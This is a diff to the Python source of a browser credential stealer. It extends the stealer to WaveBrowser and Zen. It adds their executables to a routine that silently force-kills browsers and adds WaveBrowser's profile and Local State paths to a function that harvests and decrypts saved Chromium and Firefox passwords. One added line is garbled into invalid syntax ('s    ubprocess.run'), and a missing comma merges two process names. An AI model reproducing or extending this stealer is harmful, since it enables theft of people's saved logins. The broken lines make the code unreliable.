@@ -58,10 +58,10 @@ def load_nss(profile_path, nss3):
             return nss
 
 def kill():
-    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'iridium.exe', 'vivaldi.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
 
     for exe in exes:
-        subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        s    ubprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def decrypt_firefox_password(nss, encrypted_str):
     class SECItem(ctypes.Structure):
@@ -208,6 +208,7 @@ def stealchromium():
         'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
         'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
         'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
+        'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
         'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
         'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
         'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
